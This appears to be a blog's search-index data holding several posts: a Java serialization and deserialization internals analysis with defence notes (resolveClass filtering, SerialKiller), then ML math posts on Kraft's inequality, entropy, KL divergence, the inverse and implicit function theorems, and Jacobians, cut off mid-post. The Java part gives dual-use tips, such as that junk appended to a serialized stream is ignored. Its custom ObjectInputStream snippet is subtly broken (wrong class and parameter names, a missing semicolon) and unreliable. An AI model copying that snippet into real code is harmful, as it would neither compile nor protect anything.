在序列化对象的数据之前，首先会有一个对象类型的分类判断，这里分成四种类型来处理即null类型（TC_NULL）、handle类型（TC_REFERENCE）、代理类型（TC_PROXYCLASSDESC）、普通类型（TC_CLASSDESC）。我们这里的User是普通的类所以走最后的writeNonProxyDesc。 writeNonProxyDesc会先调用writeClassDescriptor把自己的属性信息写入，然后递归调用writeClassDesc写入父类元信息。 细看一下writeClassDescriptor，这里面会调用writeNonProxy。 最后调用writeNonProxy，在for循环里面写入属性信息。 这一段的写入如果最后用dump出来，就是下面这个样子。 writeSerialData 把类属性信息写去之后，接下来就是写类属性对应的具体值了。 ps:非原生数据类型指的是字符串、数组、枚举类型、对象。 _ 一个完整的dump如下。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465STREAM_MAGIC - 0xac edSTREAM_VERSION - 0x00 05Contents TC_OBJECT - 0x73 TC_CLASSDESC - 0x72 className Length - 4 - 0x00 04 Value - User - 0x55736572 serialVersionUID - 0xbb 67 4f fb 9b a9 d6 bb newHandle 0x00 7e 00 00 classDescFlags - 0x02 - SC_SERIALIZABLE fieldCount - 4 - 0x00 04 Fields 0: Int - I - 0x49 fieldName Length - 3 - 0x00 03 Value - age - 0x616765 1: Int - I - 0x49 fieldName Length - 5 - 0x00 05 Value - money - 0x6d6f6e6579 2: Object - L - 0x4c fieldName Length - 9 - 0x00 09 Value - firstname - 0x66697273746e616d65 className1 TC_STRING - 0x74 newHandle 0x00 7e 00 01 Length - 18 - 0x00 12 Value - Ljava/lang/String; - 0x4c6a6176612f6c616e672f537472696e673b 3: Object - L - 0x4c fieldName Length - 8 - 0x00 08 Value - lastname - 0x6c6173746e616d65 className1 TC_REFERENCE - 0x71 Handle - 8257537 - 0x00 7e 00 01 classAnnotations TC_ENDBLOCKDATA - 0x78 superClassDesc TC_NULL - 0x70 newHandle 0x00 7e 00 02 classdata User values age (int)20 - 0x00 00 00 14 money (int)100 - 0x00 00 00 64 firstname (object) TC_STRING - 0x74 newHandle 0x00 7e 00 03 Length - 6 - 0x00 06 Value - cl0und - 0x636c30756e64 lastname (object) TC_STRING - 0x74 newHandle 0x00 7e 00 04 Length - 5 - 0x00 05 Value - lisan - 0x6c6973616e 可以看到在序列化的时候世界上是写入了各字段长度的，所以在后面反序列化读的时候是按照字段长度来进行读取的。这也解释了为什么在反序列化数据后面插入脏数据会不会影响反序列化。 反序列化 预处理 反序列化和序列化互为称操作，其主要的操作在readObject0里面 case到object进行反序列化，整个object的反序化在readOrdinaryObject中 和序列化对称还是分两步，第一步是读取出类的元信息（readClassDesc），第二步是读取出对象属性具体的数据（readSerialData）。 反序列化数据 readClassDesc 在序列化那里提到过，对把类类型分成四个类型处理，这里的User是非代理普通类，就走readNonProxyDesc。 readNonProxyDesc中主要的操作在readClassDescriptor、resolveClass、initNonProxy（注意这里initNonProxy的最后一个传参，这里递归调用了readClassDesc）。 readClassDescriptor读出了类的元数据并把每一个属性名抽象成了ObjectStreamField类 resolveClass对类类型进行了构建，注意这里第二参数为false，意味着并不会执行类的初始化（static代码块不执行） 。 另外注意这里解释了为什么设置反序列化防御的点是在resolveClass，如果想对反序列化设置防御，就需要自己实现一个ObjectInputStream。 12345678910class MyObjInputStream extends ObjInputStream { public MyObjInputStream(InputStream in) throws IOException{ super(in); } protected Class&lt;?&gt; resolveClass(ObjInputStream desc) throws IOException, ClassNotFoundException { System.out.println(&quot;defence&quot;); return super.resolveClass(desc) }} initNonProxy又构建了类的元信息。 最后desc（ObjectStreamClass）传出给外层readOrdinaryObject。首先会进行对象的初始化，然后读出数据注入类中。 readSerialData 如果我们自定义了readObject方法，那么这里就会invoke，这里解释了为什么就java反序列化使用而言是反序列化类的readObject开始。 但是在User类中在我们并没有自定义反序列化方法随意还是走默认路线。 defaultReadFields，中第一个循环把原生类型数据赋给obj，第二个循环把数组、枚举类型、对象类型赋给obj。 补充一张整个反序列化的时序图。 从SerialKiller来java反序列化防御 https://github.com/ikkisoft/SerialKiller 原生使用 12ObjectInputStream ois = new ObjectInputStream(is);String msg = (String) ois.readObject(); 加上SerialKiller后的使用 12ObjectInputStream ois = new SerialKiller(is, &quot;/etc/serialkiller.conf&quot;);String msg = (String) ois.readObject(); 可以看到它的原理就是上面提的自己实现流并且在resolveClass处加上白名单或者黑名单的过滤。 杂 当父子接口同时实现了Serializable接口时 1234567891011121314151617181920212223class UserBase implements Serializable{ public int age; UserBase(){ System.out.println(&quot;UserBase无参构造&quot;); } UserBase(int age){ this.age = age; System.out.println(&quot;UserBase有参构造&quot;); }}class User2 extends UserBase implements Serializable{ User2(){ System.out.println(&quot;User2无参构造&quot;); } User2(int age){ this.age = age; System.out.println(&quot;User2有参构造&quot;); }} 控制台输出 1234UserBase无参构造User2有参构造-----------------2333 当只有子类实现Serializable接口父类没有实现时。 123456789101112131415161718192021222324252627282930313233343536373839import java.io.*;public class SerialAndUnserial { public static void main(String[] args) throws IOException, ClassNotFoundException { ObjectOutputStream oops = new ObjectOutputStream(new FileOutputStream(&quot;./serializable.txt&quot;)); oops.writeObject(new User2(2333)); System.out.println(&quot;-----------------&quot;); ObjectInputStream oips = new ObjectInputStream(new FileInputStream(&quot;./serializable.txt&quot;)); User2 user = (User2) oips.readObject(); System.out.println(user.age); }}class UserBase { public int age; UserBase(){ System.out.println(&quot;UserBase无参构造&quot;); } UserBase(int age){ this.age = age; System.out.println(&quot;UserBase有参构造&quot;); }}class User2 extends UserBase implements Serializable{ User2(){ System.out.println(&quot;User2无参构造&quot;); } User2(int age){ this.age = age; System.out.println(&quot;User2有参构造&quot;); }} 12345UserBase无参构造User2有参构造-----------------UserBase无参构造0 总结及一些tip 序列化时，当写入类的元数据的时候，是先写子类的类元数据，然后递归调用的写入父类的类元数据（只有实现序列化接口的才会有类元数据）。 防御反序列化的原理是在resolveClass处设防而不是readResolve 在序列化数据末尾加入脏数据不会影响正常的反序列化。 参考 java中的序列化与反序列化及其源码分析（特别详细） 先知大会议题Java反序列化实战 [从WebLogic看反序列化漏洞的利用与防御](","link":"/2020/02/14/Java%E5%8E%9F%E7%94%9F%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%A3%E7%A0%81%E7%AE%80%E8%A6%81%E5%88%86%E6%9E%90/"},{"title":"ML的信息论基石-kraft不等式，信息熵，KL散度","text":"注：请多刷新一次前端，以便让数学公式正确渲染。 一、基本名词与概念1. 前缀码与前缀自由码 前缀码：没有一个码字是另一个码字的前缀。例如霍夫曼码。 重要性：前缀码满足即时唯一可译性（译码时不会二义并且即时解码AA）。 2. Kraft不等式Kraft不等式是信息论中关于前缀编码（或者说前缀码树/二叉树）的一个重要结论。它说明任意一组前缀码的码长 $ l_1, l_2, \\ldots, l_n $ 必须满足 $ \\sum_{i=1}^n 2^{-l_i} \\leq 1 $ 反之，只有满足这个不等式才有可能存在对应的前缀码。 Kraft不等式证明必要性（任何前缀码的一组码长都满足Kraft不等式）： 设$ D $为二叉树，每个码字可表示为树的一条路径。 码长为 $ l_k $ 的码字在树的第 $ l_k $ 层，是一个叶子。 每一层最多有 $ 2^{l_k} $ 个节点，叶子节点互不重叠。 所有码字实际占用的叶子数之和 $ \\sum_{i=1}^n 2^{L-l_i} $ 其中 $ L $ 为所有码长的最大值。 总叶子数为 $ 2^L $ 所以有：$ \\sum_{i=1}^n 2^{L-l_i} \\leq 2^L \\implies \\sum_{i=1}^n 2^{-l_i} \\leq 1 $ 补充：什么叫码字实际占用的叶子数之和？ _假设我们最大码长是 _$ L $_，再看一个码字长度是 _$ l $。 一个长度为 $ l $ 的码字，从根到它走了 $ l $ 步。 _如果继续从它往下走，走满长度 _$ L $，还能走 $ (L-l) $ 步。 每多一步可分岔两路，$ (L-l) $_ 步一共可以分成 $ 2^{L-l} $ 个不同的终点（叶子）。_ 所以长度为 $ l $ 的码字，等价于在最大深度 $ L $ 处“占用”了 $ 2^{L-l} $ 个叶子。 充分性（只要码长满足Kraft不等式，就能构造前缀码）： 将所有 $ l_i $ 从小到大排序。 从编码树顶部出发，依次分配以 $ l_i $ 为长度的唯一路径（即叶子结点）；因Kraft不等式成立，子树不会重叠，必能分配完全部码字且不会出现有一个码字是其他码字前缀的情况。 具体可采用“字典树”方式依次分配。 3. 信息熵（Shannon Entropy）对离散信源$ X $（概率分布为 $ {p_1, p_2, …, p_n} $）： $ H(X) = -\\sum_{i=1}^n p_i \\log_2 p_i $ 这个数是用拉个朗日乘数法得到的，可以参考下面 “最优编码定理”。 熵是最优平均编码长度的下界。 4. 最优编码定理这里摘要这个视频里面的证明：https://www.bilibili.com/video/BV1sV411k7qc/平均码长的最小值为熵或近似熵（$ \\lceil l_i \\rceil $ 情况下高于熵但不会超过1bit）： $ H(X) \\leq L^* &lt; H(X) + 1 $ 假设我们要对一个文章中的字母用前缀码进行编码，那么如何让整个文章的编码最短的问题就转换为使得下图的中的E(L)变得最小。目标函数有了，优化的约束就是Kraft不等式（满足前缀码的充要条件）。这里选择用拉格朗日乘数法来求解，但是拉格朗日乘数法只适合解等式不能解不等式。所以先考虑等式的情况。 $l_i = - \\log_2 p_i$，这里的$l_i$就是每个字母对应的码长了。因为码长不能是小数，所以要进行上取整。 相关推导正是“在Kraft约束下极小化码长”——见“熵的最优性推导”小节。 5. 交叉熵与KL散度 交叉熵 $ H(P, Q) $：用$ Q $分布编码真实分布$ P $的信息平均长度： $ H(P, Q) = -\\sum_x p(x) \\log q(x) $ KL散度（相对熵）： $ D_{KL}(P | Q) = \\sum_x p(x) \\log \\frac{p(x)}{q(x)} = H(P, Q) - H(P) $ 表示用$ Q $代替$ P $时的“额外码长”。 二、各部分逻辑关系 Kraft不等式 —— 判断前缀码能否存在及如何分配码长； 最优编码定理 —— 满足Kraft不等式的最优平均编码长度的理论极限； 信息熵 —— 度量信源不确定性，也限制度量最优编码效率； 交叉熵/相对熵 (KL散度) —— 两个概率分布编码效率的度量，机器学习损失函数常用。 简要表格 概念 数学表达 目的/意义 Kraft不等式 $ \\sum 2^{-l_i} \\leq 1 $ 判断能否分配码长形成前缀码 信息熵 $ H(X) = -\\sum p_i \\log_2 p_i $ 不确定性度量、最优平均码长下界 最优编码定理 $ H(X) \\leq L^* &lt; H(X)+1 $ 连接实际编码与熵的极限 交叉熵 $ H(P, Q) = -\\sum p(x)\\log q(x) $ “用Q表示P”的平均信息长度 KL散度 $D_{KL}(P|Q)=\\sum p(x)\\log\\frac{p(x)}{q(x)}$ Q相对P的“额外消耗”，度量分布差异 参考https://www.bilibili.com/video/BV1sV411k7qc/","link":"/2025/05/03/ML%E7%9A%84%E4%BF%A1%E6%81%AF%E8%AE%BA%E5%9F%BA%E7%9F%B3-kraft%E4%B8%8D%E7%AD%89%E5%BC%8F%EF%BC%8C%E4%BF%A1%E6%81%AF%E7%86%B5%EF%BC%8CKL%E6%95%A3%E5%BA%A6/"},{"title":"ML的数学基石-逆函数定理（Inverse function theorem）","text":"注：请多刷新一次前端，以便让数学公式正确渲染。 前置知识单射，满射，双射 单射：每个输入值有唯一的输出值，不会有两个不同的输入映射到同一个输出。 满射：每个输出值都至少有一个输入值与之对应。 双射：既是单射又是满射，即每个输入值有唯一的输出值，且每个输出值都有唯一的输入值。 雅可比矩阵 (Jacobian Matrix)雅可比矩阵是描述多元函数在某一点处的局部线性近似的矩阵形式，具体定义见前文。 预备知识 - 完备度量空间1.1 度量空间的基本定义一个度量空间是一个集合 $S$ 配备了一个“度量函数” $d: S \\times S \\to \\mathbb{R}$，它满足以下性质（即定义“距离”的规则）： 非负性：$$d(x, y) \\geq 0, \\quad \\text{且当且仅当 } x = y, \\ d(x, y) = 0;$$ 对称性：$$d(x, y) = d(y, x);$$ 三角不等式：对任意 $x, y, z \\in S$，有$$d(x, z) \\leq d(x, y) + d(y, z).$$度量 $d(x, y)$ 定义了集合 $S$ 中任意两点之间的距离，使 $S$ 成为一个度量空间。 1.2 完备性：柯西序列的收敛性一个度量空间 $(S, d)$ 是完备的，当且仅当空间内的每个柯西序列都收敛于 $S$ 中的一个点。 什么是柯西序列？一个序列 ${x_n} \\subseteq S$ 是一个柯西序列，如果它满足以下条件： 对于任意的 $\\varepsilon &gt; 0$，存在一个整数 $N &gt; 0$，使得当 $m, n \\geq N$ 时，$$d(x_m, x_n) &lt; \\varepsilon.$$ 简单来说，在柯西序列中，序列的元素在这个空间中变得越来越“接近彼此”。例如： 如果序列越来越“集中”到一个点附近，就是柯西序列（无论这个点是否是空间内部的点）。 注意：柯西序列的定义不要求你事先知道收敛点，仅要求元素之间的距离无限趋近于零。 示例 正例：序列 $x_n = 1 + \\frac{1}{n}$ 是一个柯西序列。 反例：对于非完备的空间（例如 $\\mathbb{Q}$ 上），可能存在柯西序列无法收敛到 $\\mathbb{Q}$ 内的一个点。例如，序列 $x_n = 1, 1.4, 1.414, 1.4142, \\dots$ 收敛到 $\\sqrt{2}$，但 $\\sqrt{2} \\notin \\mathbb{Q}$。这说明 $\\mathbb{Q}$ 不完备。 1.3 完备性的意义 在一个完备度量空间中，任何柯西序列一定会收敛，并且其极限点一定在空间 $S$ 内。 如果一个空间不是完备的，则可能存在柯西序列，其极限点落在 $S$ 外部（即序列离开了原来的空间）。 预备知识 - Banach 不动点定理定理陈述设 $(X, d)$ 是一个完备度量空间，$T: X \\to X$ 是一个压缩映射，即存在常数 $0 \\leq k &lt; 1$，使得对于任意 $x, y \\in X$，有：$$d(T(x), T(y)) \\leq k \\cdot d(x, y).$$那么，$T$ 在 $X$ 中存在唯一的不动点 $x^*$，即 $T(x^*)=x^*$。 符号解释 $X$：一个集合，表示度量空间中的元素。 $d$：度量函数，表示 $X$ 中两个元素之间的距离，满足非负性、对称性和三角不等式。 完备度量空间：度量空间 $(X, d)$ 是完备的，如果其中的所有柯西序列都收敛于 $X$ 中的某个点。 $T$：映射（函数），将 $X$ 中的元素映射到 $X$ 中的另一个元素。 压缩映射：映射 $T$ 是压缩的，如果存在常数 $0 \\leq k &lt; 1$，使得 $T$ 将任意两点之间的距离缩小至少 $k$ 倍。 不动点：点 $x^*$ 是 $T$ 的不动点，如果 $T(x^*) = x^*$。 证明1. 构造序列：从任意一点 $x_0 \\in X$ 开始，构造序列 ${x_n}$，其中：$$x_{n+1} = T(x_n),$$即每次将当前点通过映射 $T$ 映射到下一个点。 2. 证明序列是柯西序列：对于任意 $n, m \\in \\mathbb{N}$（假设 $n &gt; m$），有：$$d(x_n, x_m) \\leq d(x_n, x_{n-1}) + d(x_{n-1}, x_{n-2}) + \\dots + d(x_{m+1}, x_m).$$由于 $T$ 是压缩映射，有：$$d(x_{i+1}, x_i) = d(T(x_i), T(x_{i-1})) \\leq k \\cdot d(x_i, x_{i-1}).$$递推可得：$$d(x_{i+1}, x_i) \\leq k^i \\cdot d(x_1, x_0).$$由于 $0 \\leq k &lt; 1$，最终 $d(x_n, x_m)$ 收敛到 0，故 ${x_n}$ 是柯西序列。 3. 完备性保证极限存在：因为 $X$ 是完备的，柯西序列 ${x_n}$ 收敛于某个点 $x^* \\in X$。注意，定理条件中给出了 $T$ 是 $X$ 到 $X$ 的映射。 4. 证明 $x^*$ 是不动点：由于 $T$ 是连续的（压缩映射是连续的），有：$$T(x^*) = T\\left(\\lim_{n \\to \\infty} x_n\\right) = \\lim_{n \\to \\infty} T(x_n) = \\lim_{n \\to \\infty} x_{n+1} = x^*.$$因此，$x^*$ 是 $T$ 的不动点。 5. 唯一性：假设存在另一个不动点 $y^*$，即 $T(y^*) = y^*$，则：$$d(x^*, y^*) = d(T(x^*), T(y^*)) \\leq k \\cdot d(x^*, y^*).$$由于 $0 \\leq k &lt; 1$，只有当 $d(x^*, y^*) = 0$ 时成立，即 $x^* = y^*$。因此，不动点唯一。 总结 Banach 不动点定理表明，在完备度量空间中，压缩映射存在唯一的不动点。 证明的关键是通过构造序列并利用压缩映射的性质证明序列收敛，然后验证极限点是不动点。 该定理在数值分析、微分方程和优化等领域有广泛应用。 逆函数定理的证明定理内容给定一个连续可微函数 $f: \\mathbb{R}^n \\to \\mathbb{R}^n$，若在某一点 $x_0 \\in \\mathbb{R}^n$，该函数的雅可比矩阵 $J_f(x_0)$ 是满秩的（即 $\\det(J_f(x_0)) \\neq 0$，雅可比矩阵可逆），那么可以得出以下结论： 局部可逆性：在点 $x_0$ 的某个小邻域内，$f$ 是双射（即每个点都有唯一的像，并且每个像值对应唯一的原点），即 $f$ 在该邻域内有逆函数 $f^{-1}$。 逆函数的性质：逆函数 $f^{-1}$ 也是连续可微的（$C^1$），并且其导数由雅可比矩阵的逆给出：$$J_{f^{-1}}(f(x)) = [J_f(x)]^{-1},$$对于 $x$ 在邻域内。 总结来说，如果 $J_f(x_0)$ 是可逆的，则 $f$ 在 $x_0$ 的邻域内具有光滑的逆函数。 注： 其实当时学到这里是有一个疑问，不知道为什么需要前面预备知识的铺垫。因为雅可比矩阵可逆，不就已经说明了是有逆函数的，还需要证明吗？ 但雅可比矩阵是泰勒公式的一阶展开，“一阶可逆”只能保证在无穷小邻域接近可逆，但是逆函数定理说的局部，并不是指无穷小（infinitesimal）邻域；而是“存在某个非零半径的开邻域”，通常记为 $U$。在这个$U$里，$f$关于 $x0$ 是双射（即一一对应），并且逆函数还是光滑/连续可微的。 换句话说这里是在高阶项的扰动不会”压倒”线性项：在足够小但是非无穷小邻域接近可逆的范围内，线性项占主导。（线性部分 + 小扰动 = 整体可逆） 直观思路逆函数 $f^{-1}$ 的基本定义是：给定 $y \\in \\mathbb{R}^n$，我们需要找到唯一的 $x \\in \\mathbb{R}^n$，使得 $f(x) = y$。若 $f$ 在某点 $x_0$ 处是可逆的（即雅可比矩阵 $J_f(x_0)$ 可逆），可以通过近似线性化的方法（泰勒展开），证明每一个 $y$ 都有一个唯一解 $x$ 使 $f(x) = y$，而这个解可以通过压缩映射定理来找到。 详细证明（1）定义辅助映射：设 $y \\in \\mathbb{R}^n$ 是任意的目标值，并且我们希望找到 $x \\in \\mathbb{R}^n$，使得 $f(x) = y$。令：$$T(x) = x - J_f(x_0)^{-1} \\cdot (f(x) - y),$$其中 $J_f(x_0)$ 是 $f$ 在点 $x_0$ 的雅可比矩阵。 需要证明： 映射 $T(x)$ 是一个压缩映射； 压缩映射 $T(x)$ 的不动点 $x^*$ 满足 $f(x^*) = y$。 （2）泰勒展开（局部线性化）：由 $f(x)$ 在点 $x_0$ 的泰勒展开（在一阶导数处截断）：$$f(x) \\approx f(x_0) + J_f(x_0) \\cdot (x - x_0).$$令 $\\Delta x = x - x_0$，有：$$f(x) \\approx f(x_0) + J_f(x_0) \\cdot \\Delta x.$$设 $y = f(x)$，可以通过线性化近似得到：$$x \\approx x_0 + J_f(x_0)^{-1} \\cdot (y - f(x_0)).$$这表明，对于充分小的扰动 $y - f(x_0)$，可以从初始点 $x_0$ 通过迭代来逐步接近解。 注：已知$y$找到对应$x$，通过迭代来求解。这里核心是要正明迭代可以收敛，于是下面构造压缩映射。 （3）设计压缩映射：选定 $x_0$ 邻域内的点 $x$ 和目标值 $y$，定义迭代映射：$$T(x) = x - J_f(x_0)^{-1} \\cdot (f(x) - y).$$我们需要证明 $T(x)$ 是压缩映射。注意到：$$T(x) - T(z) = x - z - J_f(x_0)^{-1} \\cdot (f(x) - f(z)).$$利用 $f(x)$ 的连续可微性，有：$$f(x) - f(z) = J_f( c ) \\cdot (x - z),$$注：拉格朗日中值定理，$c$是拉格朗日中值。其中 $J_f(c)$ 是某个点 $c \\in \\mathbb{R}^n$ 的雅可比矩阵。代入得到：$$T(x) - T(z) = (I - J_f(x_0)^{-1} \\cdot J_f( c )) \\cdot (x - z).$$若 $J_f(x_0)$ 足够接近于 $J_f( c )$（在 $x_0$ 的邻域内），矩阵 $I - J_f(x_0)^{-1} J_f( c )$ 的范数小于 1，因此 $T$ 是压缩映射。 （4）应用压缩映射定理：根据压缩映射定理，$T(x)$ 有唯一的不动点 $x^*$。对于该不动点，有：$$T(x^*) = x^* \\implies x^* - J_f(x_0)^{-1} \\cdot (f(x^*) - y) = x^*,$$化简得到：$$f(x^*) = y.$$因此，$x^*$ 是方程 $f(x) = y$ 的唯一解。 （5）局部可逆性与光滑性：上述过程说明 $f$ 在 $x_0$ 的某邻域是局部可逆的，并且 $f^{-1}$ 是由连续迭代构造的，因此它是光滑（$C^1$）的。","link":"/2025/03/05/ML%E7%9A%84%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%9F%B3-%E5%8F%8D%E5%87%BD%E6%95%B0%E5%AE%9A%E7%90%86%EF%BC%88Inverse-function-theorem%EF%BC%89/"},{"title":"ML的数学基石-隐函数定理（Implicit function theorem）","text":"注：请多刷新一次前端，以便让数学公式正确渲染。 通过之前博文学习的反函数定理，雅可比矩阵等推到出隐函数定理。 隐函数定理的陈述首先，让我们明确隐函数定理要说什么： 隐函数定理：设 $ F: \\mathbb{R}^{n+m} \\to \\mathbb{R}^m $ 是 $ C^1 $ 函数，点 $ (a,b) \\in \\mathbb{R}^n \\times \\mathbb{R}^m $ 满足： $ F(a,b) = 0 $ $ \\frac{\\partial F}{\\partial y}(a,b) $ 是可逆的 $ m \\times m $ 矩阵 则存在 $ a $ 的邻域 $ U $ 和 $ b $ 的邻域 $ V $，以及 $ C^1 $ 函数 $ g: U \\to V $，使得： $ g(a) = b $ 对所有 $ x \\in U $，有 $ F(x, g(x)) = 0 $ 从反函数定理推导隐函数定理步骤 1：构造辅助函数定义函数 $ G: \\mathbb{R}^{n+m} \\to \\mathbb{R}^{n+m} $： $ G(x,y) = (x, F(x,y)) $ 其中 $ x \\in \\mathbb{R}^n $，$ y \\in \\mathbb{R}^m $。 步骤 2：计算雅可比矩阵$ G $ 的雅可比矩阵是： $ DG(x,y) = \\begin{pmatrix}I_n &amp; 0 \\\\\\frac{\\partial F}{\\partial x} &amp; \\frac{\\partial F}{\\partial y}\\end{pmatrix} $ 其中 $ I_n $ 是 $ n \\times n $ 单位矩阵。 附录里面的给出这一步的详细推导。 步骤 3：验证雅可比矩阵可逆在点 $ (a,b) $ 处，由于 $ \\frac{\\partial F}{\\partial y}(a,b) $ 可逆，我们可以计算： $ \\det(DG(a,b)) = \\det(I_n) \\cdot \\det\\left(\\frac{\\partial F}{\\partial y}(a,b)\\right) \\neq 0 $ 因此 $ DG(a,b) $ 是可逆的。 步骤 4：应用反函数定理由反函数定理，存在 $ (a,b) $ 的邻域 $ W $ 和 $ G(a,b) = (a,0) $ 的邻域 $ W’ $，使得 $ G: W \\to W’ $ 有 $ C^1 $ 逆函数 $ G^{-1} $。 步骤 5：构造隐函数设 $ G^{-1}(x,z) = (H_1(x,z), H_2(x,z)) $，其中 $ H_1: W’ \\to \\mathbb{R}^n $，$ H_2: W’ \\to \\mathbb{R}^m $。 由于 $ G \\circ G^{-1} = \\text{原来映射出的值}$，我们有：$ G(H_1(x,z), H_2(x,z)) = (x,z) $ 展开得：$ (H_1(x,z), F(H_1(x,z), H_2(x,z))) = (x,z) $ 这给出： $ H_1(x,z) = x $ $ F(x, H_2(x,z)) = z $ 步骤 6：定义隐函数取 $ z = 0 $，定义 $ g(x) = H_2(x,0) $。 由于 $ G^{-1}(a,0) = (a,b) $，我们有 $ g(a) = H_2(a,0) = b $。 对于 $ x $ 在 $ a $ 的适当邻域内，由步骤5的第二个等式： $ F(x, g(x)) = F(x, H_2(x,0)) = 0 $ 通俗理解整个过程如果 $G$ 有反函数 $G^{-1}$，那么： 给定 $(x, 0)$，$G^{-1}$ 能告诉我们对应的 $(x, y)$ 这个对应中的$y$ 正好满足$F(x, y) = 0$。 附录：推导DG(x,y)的左上角为什么是单位矩阵我来详细推导为什么雅可比矩阵 $ DG(x,y) $ 的左上角是单位矩阵 $ I_n $。 回顾函数定义我们定义了函数 $ G: \\mathbb{R}^{n+m} \\to \\mathbb{R}^{n+m} $： $ G(x,y) = (x, F(x,y)) $ 其中： $ x = (x_1, x_2, …, x_n) \\in \\mathbb{R}^n $ $ y = (y_1, y_2, …, y_m) \\in \\mathbb{R}^m $ $ F: \\mathbb{R}^{n+m} \\to \\mathbb{R}^m $ 分解 $ G $ 的分量我们可以将 $ G $ 写成分量形式： $ G(x,y) = \\begin{pmatrix}g_1(x,y) \\\\g_2(x,y) \\\\\\vdots \\\\g_n(x,y) \\\\g_{n+1}(x,y) \\\\\\vdots \\\\g_{n+m}(x,y)\\end{pmatrix} = \\begin{pmatrix}x_1 \\\\x_2 \\\\\\vdots \\\\x_n \\\\F_1(x,y) \\\\\\vdots \\\\F_m(x,y)\\end{pmatrix} $ 计算雅可比矩阵的元素雅可比矩阵 $ DG(x,y) $ 的第 $ (i,j) $ 元素是 $ \\frac{\\partial g_i}{\\partial x_j} $ 或 $ \\frac{\\partial g_i}{\\partial y_k} $。 对于前 $ n $ 行（$ i = 1, 2, …, n $）：由于 $ g_i(x,y) = x_i $，我们有： 当 $ j \\leq n $ 时：$ \\frac{\\partial g_i}{\\partial x_j} = \\frac{\\partial x_i}{\\partial x_j} = \\begin{cases} 1 &amp; \\text{如果 } i = j \\ 0 &amp; \\text{如果 } i \\neq j \\end{cases} $ 当 $ j &gt; n $ 时（即对 $ y_k $ 求导）：$ \\frac{\\partial g_i}{\\partial y_k} = \\frac{\\partial x_i}{\\partial y_k} = 0 $ 构造雅可比矩阵因此，雅可比矩阵的形式是： $ DG(x,y) = \\begin{pmatrix}\\frac{\\partial x_1}{\\partial x_1} &amp; \\cdots &amp; \\frac{\\partial x_1}{\\partial x_n} &amp; \\frac{\\partial x_1}{\\partial y_1} &amp; \\cdots &amp; \\frac{\\partial x_1}{\\partial y_m} \\\\\\vdots &amp; \\ddots &amp; \\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots \\\\\\frac{\\partial x_n}{\\partial x_1} &amp; \\cdots &amp; \\frac{\\partial x_n}{\\partial x_n} &amp; \\frac{\\partial x_n}{\\partial y_1} &amp; \\cdots &amp; \\frac{\\partial x_n}{\\partial y_m} \\\\\\frac{\\partial F_1}{\\partial x_1} &amp; \\cdots &amp; \\frac{\\partial F_1}{\\partial x_n} &amp; \\frac{\\partial F_1}{\\partial y_1} &amp; \\cdots &amp; \\frac{\\partial F_1}{\\partial y_m} \\\\\\vdots &amp; \\ddots &amp; \\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots \\\\\\frac{\\partial F_m}{\\partial x_1} &amp; \\cdots &amp; \\frac{\\partial F_m}{\\partial x_n} &amp; \\frac{\\partial F_m}{\\partial y_1} &amp; \\cdots &amp; \\frac{\\partial F_m}{\\partial y_m}\\end{pmatrix} $ 代入我们计算的值： $ DG(x,y) = \\begin{pmatrix}1 &amp; 0 &amp; \\cdots &amp; 0 &amp; 0 &amp; \\cdots &amp; 0 \\\\0 &amp; 1 &amp; \\cdots &amp; 0 &amp; 0 &amp; \\cdots &amp; 0 \\\\\\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots \\\\0 &amp; 0 &amp; \\cdots &amp; 1 &amp; 0 &amp; \\cdots &amp; 0 \\\\\\frac{\\partial F_1}{\\partial x_1} &amp; \\cdots &amp; \\frac{\\partial F_1}{\\partial x_n} &amp; \\frac{\\partial F_1}{\\partial y_1} &amp; \\cdots &amp; \\frac{\\partial F_1}{\\partial y_m} \\\\\\vdots &amp; \\ddots &amp; \\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots \\\\\\frac{\\partial F_m}{\\partial x_1} &amp; \\cdots &amp; \\frac{\\partial F_m}{\\partial x_n} &amp; \\frac{\\partial F_m}{\\partial y_1} &amp; \\cdots &amp; \\frac{\\partial F_m}{\\partial y_m}\\end{pmatrix} $ 这就是为什么左上角是 $ n \\times n $ 单位矩阵 $ I_n $，右上角是 $ n \\times m $ 零矩阵。","link":"/2025/05/25/ML%E7%9A%84%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%9F%B3-%E9%9A%90%E5%87%BD%E6%95%B0%E5%AE%9A%E7%90%86%EF%BC%88implicit-function-theorem%EF%BC%89/"},{"title":"ML的数学基石-雅可比矩阵（Jacobian Matrix)","text":"注：请多刷新一次前端，以便让数学公式正确渲染。 定义与基本解释雅可比矩阵是描述多元函数在某一点处的局部线性近似（即全导数）的矩阵形式。它是多变量微积分中非常重要的概念，用于研究函数的变化率、方向导数以及映射的局部特性。 一般定义：设 $ f: \\mathbb{R}^n \\to \\mathbb{R}^m $ 是从 $ \\mathbb{R}^n $ 映射到 $ \\mathbb{R}^m $ 的一个函数： $ f(x_1, x_2, \\dots, x_n) = \\begin{bmatrix}f_1(x_1, x_2, \\dots, x_n) \\\\f_2(x_1, x_2, \\dots, x_n)\\\\\\\\vdots \\\\f_m(x_1, x_2, \\dots, x_n) \\\\\\end{bmatrix}, $ 其中 $ f_1, f_2, \\dots, f_m $ 是 $ f $ 的分量函数。 在点 $ X = (x_1, x_2, \\dots, x_n) $ 处，函数 $ f $ 的雅可比矩阵 $ J_f(X) $ 是一个 $ m \\times n $的矩阵，定义为： $ J_f(X) =\\begin{bmatrix}\\frac{\\partial f_1}{\\partial x_1} &amp; \\frac{\\partial f_1}{\\partial x_2} &amp; \\cdots &amp; \\frac{\\partial f_1}{\\partial x_n} \\\\\\frac{\\partial f_2}{\\partial x_1} &amp; \\frac{\\partial f_2}{\\partial x_2} &amp; \\cdots &amp; \\frac{\\partial f_2}{\\partial x_n} \\\\\\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots \\\\\\frac{\\partial f_m}{\\partial x_1} &amp; \\frac{\\partial f_m}{\\partial x_2} &amp; \\cdots &amp; \\frac{\\partial f_m}{\\partial x_n} \\\\\\end{bmatrix}. $ 相当于 $ J_f(X) $ 的第 $ (i,j) $ 项是函数 $ f_i 